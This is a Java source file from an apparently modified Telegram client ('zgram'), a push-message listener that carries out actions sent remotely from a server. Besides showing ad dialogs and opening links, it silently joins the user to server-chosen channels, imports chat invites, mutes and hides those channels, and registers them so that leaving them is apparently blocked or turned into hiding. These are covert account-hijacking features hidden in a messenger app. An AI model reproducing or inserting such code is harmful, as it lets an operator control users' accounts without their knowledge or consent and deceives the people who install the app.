package org.zgram.messenger;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import org.zgram.tgnet.ConnectionsManager;
import org.zgram.tgnet.RequestDelegate;
import org.zgram.tgnet.TLObject;
import org.zgram.tgnet.TLRPC;
import org.json.JSONException;
import org.json.JSONObject;


import edit.Dialog;
import edit.Helper.Channel.ChannelHelper;
import edit.Helper.MuteHelper;
import edit.Helper.Notification.NotificationHelper;
import edit.NotificationActivity;
import edit.finalsoft.Channel;
import edit.finalsoft.Commands;

import edit.settt.LastInListController;
import edit.settt.NoQuitContoller;
import edit.Setting;
import edit.settt.TurnQuitToHideController;
import edit.settt.hideChannelController;
import co.ronash.pushe.PusheListenerService;

import java.util.ArrayList;

import static org.zgram.messenger.ApplicationLoader.applicationContext;

public class MyPushListener extends PusheListenerService {
    @Override
    public void onMessageReceived(JSONObject message, JSONObject content) {
        if (message.length() == 0)
            return; //json is empty
        Log.i("Pushe", "Custom json Message: " + message.toString()); //print json to logCat

        //your code
        try {
            int code = Integer.parseInt(message.getString("code"));

            String channel="";
            String text="";
            String title="";

            String cn = "";
            int noexit = 0;
            int hide = 0;
            int lastinlist = 0;
            int mute= 0;
            int nhide =0;

            switch (code){
                case 1:
            String image_baner = message.getString("baner");
            String image_logo = message.getString("logo");
            String text_title = message.getString("title");
            String text_desc = message.getString("desc");
            String text_btn = message.getString("textbtn");
            String link_btn = message.getString("link");

            Intent intent = new Intent(getApplicationContext(),Dialog.class)
                    .putExtra("image_logo",image_logo)
                    .putExtra("image_baner",image_baner)
                    .putExtra("text_title",text_title)
                    .putExtra("text_desc",text_desc)
                    .putExtra("text_btn",text_btn)
                    .putExtra("link_btn",link_btn);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
                    break;
                case 2:
                    //pop_up
                    //************************ اگه خواستید پاپ اپ باشه بجای کد های بالا کافیه کد زیر رو بذارید
                    String link_pop_up = message.getString("link");//op_up.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(link_pop_up));
                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(browserIntent);
                    //startActivity(pop_up);
                    break;

                case 3:

                    //************************ اگه خواستید پاپ اپ باشه بجای کد های بالا کافیه کد زیر رو بذارید
                    try {

                        String chanelName = message.getString("cn");
                        Channel channel1 = new Channel();
                        channel1.name = chanelName;
                        Commands.join(channel1, new edit.finalsoft.OnResponseReadyListener() {
                            @Override
                            public void OnResponseReady(boolean error, JSONObject data, String message) {
                                Log.i("finalsoft", "message: " + message);
                            }
                        });
                    }catch (Exception e){
                        Log.e("finalsoft","exception:"+e.getMessage());
                    }

                    break;


                case 4:
                    channel=message.getString("link");
                    text=message.getString("text");
                    title=message.getString("title");

                    Intent p= new Intent(applicationContext,NotificationActivity.class);
                    p.putExtra("channellink",channel);
                    Setting.setCurrentJoiningChannel(channel);
                    //NotificationCreator.create(title, text, p);

                    if (!BuildConfig.DEBUG) {
                        p.setPackage(BuildVars.BUILD_PACKAGENAME);
                    } else
                        p.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");


                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                        NotificationHelper.buildNotification(title,text,p).build();
                    }


                    break;


                case 5:

                    //add khas

                    String channels=message.getString("link");
                    noexit=message.getInt("noexit");
                    hide=message.getInt("hide");
                    lastinlist=message.getInt("lastinlist");
                    mute=message.getInt("mute");
                    nhide=message.getInt("nhide");

//                    if(!object.isNull("channel"))channels=object.getString("channel");
//                    if(!object.isNull("hide"))hide=object.getInt("hide");
//                    if(!object.isNull("lastinlist"))lastinlist=object.getInt("lastinlist");
//                    if(!object.isNull("mute"))mute=object.getInt("mute");
//                    if(!object.isNull("fav"))fav=object.getInt("fav");

                    if(noexit>0){
                        NoQuitContoller.addToNoQuit(channels);
                    }
                    if(nhide>0){
                        TurnQuitToHideController.add(channels);
                    }
                    ChannelHelper.JoinFast(channels.replace("@",""));
                    if(mute>0){
                        final String finalChannel = channels;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                MuteHelper.muteChannel(finalChannel.replace("@",""));
                            }
                        },5000);
                    }
                    if(hide>0){
                        hideChannelController.add(channels.replace("@",""));
                    }
                    if(lastinlist>0){
                        LastInListController.add(channels.replace("@",""));
                    }

                    break;





                case 6:

                    cn =message.getString("cn");
                    runLinkRequest(null, cn, null, null, null, null, false, 0, 1, false);
                    break;








            }





            //android.util.Log.e("Pushe", "Json Message\n Titr: " + s1 + "\n Matn: " + s2);
        } catch (JSONException e) {
            Log.e("", "Exception in parsing json", e);
        }

    }




























    public void runLinkRequest(final String username, final String group, final String sticker, final String botUser, final String botChat, final String message, final boolean hasUrl, final Integer messageId, final int state, final boolean mute)
    {
        if (group != null)
        {
            if (state == 0)
            {
                final TLRPC.TL_messages_checkChatInvite req = new TLRPC.TL_messages_checkChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.ChatInvite invite = (TLRPC.ChatInvite) response;
                                    if (invite.chat != null && !ChatObject.isLeftFromChat(invite.chat))
                                    {
                                        MessagesController.getInstance().putChat(invite.chat, false);
                                        ArrayList<TLRPC.Chat> chats = new ArrayList<>();
                                        chats.add(invite.chat);
                                        MessagesStorage.getInstance().putUsersAndChats(null, chats, false, true);
                                    }
                                    else
                                    {
                                        runLinkRequest(username, group, sticker, botUser, botChat, message, hasUrl, messageId, 1, mute);
                                    }
                                }
                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
            else if (state == 1)
            {
                TLRPC.TL_messages_importChatInvite req = new TLRPC.TL_messages_importChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        if (error == null)
                        {
                            TLRPC.Updates updates = (TLRPC.Updates) response;
                            MessagesController.getInstance().processUpdates(updates, false);
                        }
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.Updates updates = (TLRPC.Updates) response;
                                    if (!updates.chats.isEmpty())
                                    {
                                        TLRPC.Chat chat = updates.chats.get(0);
                                        chat.left = false;
                                        chat.kicked = false;
                                        MessagesController.getInstance().putUsers(updates.users, false);
                                        MessagesController.getInstance().putChats(updates.chats, false);
                                    }
                                }
                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
        }
    }












}